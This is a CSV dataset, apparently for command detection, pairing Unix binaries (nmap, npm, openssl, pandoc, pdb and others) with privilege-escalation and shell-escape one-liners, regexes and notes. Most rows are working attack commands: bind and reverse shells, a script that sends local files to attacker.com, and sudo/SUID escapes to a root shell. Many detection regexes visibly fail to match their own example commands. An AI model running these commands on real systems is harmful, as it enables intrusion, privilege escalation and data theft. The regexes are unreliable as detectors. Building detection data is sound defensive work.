Name,Function,ExampleCode,Regex,Notes
nmap,non-interactive-bind-shell,"export LPORT=12345
TF=$(mktemp)
echo 'local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));c:send(b);
end;c:close();f:close();' > $TF
nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell.
nmap,file-upload,"nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-p\s*\-\-script\s*\-\-script\-args\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send a local file via TCP. Run `socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080."
nmap,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
TF=$(mktemp)
echo 'local f=io.open(os.getenv(""LFILE""), 'rb')
local d=f:read(""*a"")
io.close(f);
local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
t:send(d);
t:close();' > $TF
nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file."
nmap,file-download,"nmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-p\s*\-\-script\s*\-\-script\-args\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., `php -S 0.0.0.0:8080`. Note that multiple connections are made to the server and the result is placed in `$TF/IP/PORT/PATH`. Also, it is important that the port is a commonly used HTTP like 80 or 8080."
nmap,file-download,"export LPORT=12345
export LFILE=file_to_save
TF=$(mktemp)
echo 'local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
local d,x=c:receive(""*a"");
c:close();
local f=io.open(os.getenv(""LFILE""), ""wb"");
f:write(d);
io.close(f);' > $TF
nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file."
nmap,file-write,"echo 'local f=io.open(""file_to_write"", ""wb""); f:write(""data""); io.close(f);' > $TF
nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,file-write,nmap -oG=$LFILE DATA,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The payload appears inside the regular nmap output.
nmap,file-read,"echo 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);' > $TF
nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,file-read,nmap -iL file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s+.+),"The file is actually parsed as a list of hosts/networks, lines are leaked through error messages."
nmap,sudo,"echo 'os.execute(""/bin/sh"")' > $TF
sudo nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Input echo is disabled.
nmap,sudo,"sudo nmap --interactive
nmap> !sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-interactive\s+.+),"The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands."
nmap,limited-suid,"echo 'os.execute(""/bin/sh"")' > $TF
./nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Input echo is disabled.
nmap,suid,./nmap -oG=$LFILE DATA,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The payload appears inside the regular nmap output.
nohup,shell,"nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)""",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nohup\s*\-c\s+(?:/bin/(?:sh|bash))),
nohup,command,"nohup ""$COMMAND""
cat nohup.out","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nohup\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nohup,suid,"./nohup /bin/sh -p -c ""sh -p <$(tty) >$(tty) 2>$(tty)""",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nohup\s*\-p\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash))),
nohup,sudo,"sudo nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)""",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nohup\s*\-c\s+(?:/bin/(?:sh|bash))),
npm,shell,npm exec /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?npm\s+(?:/bin/(?:sh|bash))),
npm,shell,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json
npm -C $TF i","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?npm\s*\-C\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`."
npm,sudo,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?npm\s*\-C\s*\-\-unsafe\-perm\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`."
nroff,file-read,nroff $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nroff\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file is typeset and some warning messages may appear.
nroff,shell,"echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
GROFF_BIN_PATH=$TF nroff","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nroff\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nroff,sudo,"echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
sudo GROFF_BIN_PATH=$TF nroff","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nroff\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nsenter,shell,nsenter /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nsenter\s+(?:/bin/(?:sh|bash))),
nsenter,sudo,sudo nsenter /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nsenter\s+(?:/bin/(?:sh|bash))),
ntpdate,file-read,ntpdate -a x -k $LFILE -d localhost,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ntpdate\s*\-a\s*\-k\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ntpdate,sudo,sudo ntpdate -a x -k $LFILE -d localhost,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ntpdate\s*\-a\s*\-k\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ntpdate,suid,./ntpdate -a x -k $LFILE -d localhost,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ntpdate\s*\-a\s*\-k\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
octave,shell,"octave-cli --eval 'system(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?octave\s*\-\-eval\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
octave,file-write,"octave-cli --eval 'filename = ""file_to_write""; fid = fopen(filename, ""w""); fputs(fid, ""DATA""); fclose(fid);'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?octave\s*\-\-eval\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
octave,file-read,"octave-cli --eval 'format none; fid = fopen(""file_to_read""); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?octave\s*\-\-eval\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
octave,sudo,"sudo octave-cli --eval 'system(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?octave\s*\-\-eval\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
octave,limited-suid,"./octave-cli --eval 'system(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?octave\s*\-\-eval\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
od,file-read,"od -An -c -w9999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?od\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
od,suid,"./od -An -c -w9999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?od\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
od,sudo,"sudo od -An -c -w9999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?od\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,reverse-shell,mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s*\-i\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","To receive the shell run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

Communication between attacker and target will be encrypted.
"
openssl,file-upload,"openssl s_client -quiet -connect $RHOST:$RPORT < ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","To collect the file run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save

Send a local file via TCP. Transmission will be encrypted.
"
openssl,file-download,"openssl s_client -quiet -connect $RHOST:$RPORT > ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","To send the file run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send

Fetch a file from a TCP port, transmission will be encrypted.
"
openssl,file-write,"echo DATA | openssl enc -out ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,file-write,"echo ""DATA"" > $TF
openssl enc -in ""$TF"" -out ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,file-read,"openssl enc -in ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,suid,mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s*\-i\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","To receive the shell run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

Communication between attacker and target will be encrypted.
"
openssl,suid,"echo DATA | openssl enc -out ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,sudo,mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s*\-i\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","To receive the shell run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

Communication between attacker and target will be encrypted.
"
openssl,library-load,openssl req -engine ./lib.so,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+.+),
openvpn,shell,openvpn --dev null --script-security 2 --up '/bin/sh -c sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-dev\s*\-\-script\-security\s*\-\-up\s*\-c\s+(?:/bin/(?:sh|bash))),
openvpn,file-read,"openvpn --config ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-config\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file is actually parsed and the first partial wrong line is returned in an error message.
openvpn,suid,"./openvpn --dev null --script-security 2 --up '/bin/sh -p -c ""sh -p""'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-dev\s*\-\-script\-security\s*\-\-up\s*\-p\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash))),
openvpn,suid,"./openvpn --config ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-config\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file is actually parsed and the first partial wrong line is returned in an error message.
openvpn,sudo,sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-dev\s*\-\-script\-security\s*\-\-up\s*\-c\s+(?:/bin/(?:sh|bash))),
openvpn,sudo,"sudo openvpn --config ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-config\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file is actually parsed and the first partial wrong line is returned in an error message.
openvt,sudo,"sudo openvt -- sh -c ""$COMMAND >$TF 2>&1""
cat $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openvt\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The command execution is blind (displayed on the virtual console), but it is possible to save the output on a temporary file."
opkg,sudo,sudo opkg install x_1.0_all.deb,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?opkg\s+.+),"It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
TF=$(mktemp -d)
echo 'exec /bin/sh' > $TF/x.sh
fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
```
"
pandoc,file-read,"pandoc -t plain ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-t\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pandoc,file-write,"echo DATA | pandoc -t plain -o ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-t\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pandoc,shell,"echo 'os.execute(""/bin/sh"")' >$TF
pandoc -L $TF /dev/null","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-L\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply."
pandoc,suid,"echo DATA | ./pandoc -t plain -o ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-t\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pandoc,limited-suid,"echo 'os.execute(""/bin/sh"")' >$TF
./pandoc -L $TF /dev/null","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-L\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply."
pandoc,sudo,"echo 'os.execute(""/bin/sh"")' >$TF
sudo pandoc -L $TF /dev/null","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-L\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply."
paste,file-read,paste $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?paste\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
paste,suid,paste $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?paste\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
paste,sudo,sudo paste $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?paste\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pax,file-read,"pax -w ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pax\s*\-w\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The output is a `tar` archive containing the read file as it is, hence this may not be suitable to read arbitrary binary files."
pdb,shell,"echo 'import os; os.system(""/bin/sh"")' > $TF
pdb $TF
cont","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pdb\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pdb,sudo,"echo 'import os; os.system(""/bin/sh"")' > $TF
sudo pdb $TF
cont","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pdb\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pdflatex,shell,pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pdflatex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b)),
pdflatex,file-read,"pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pdflatex\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The read file will be part of the output.
